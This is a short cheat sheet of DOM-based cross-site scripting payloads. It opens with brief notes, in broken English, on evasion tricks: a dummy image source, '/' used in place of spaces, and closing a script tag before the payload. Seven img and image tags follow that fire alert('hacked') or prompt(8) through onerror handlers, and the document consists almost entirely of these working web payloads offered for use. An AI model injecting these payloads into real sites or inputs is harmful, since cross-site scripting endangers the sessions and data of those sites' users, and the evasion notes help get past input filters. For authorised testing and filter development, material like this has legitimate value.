# Dom baseline
1.{=q}: fake image , that is no any url for image
2.{/}: clear space object
3.{</script>}: close the script, after run the payload

# Dom Xss payload(4)
<image/src/onerror=alert("hacked")>
<img/src/onerror=alert("hacked")>
<image src/onerror=alert("hacked")>
<img src/onerror=alert("hacked")>
<image src =q onerror=alert("hacked")>
<img src =q onerror=alert("hacked")>
</script><img src =q onerror=prompt(8)>

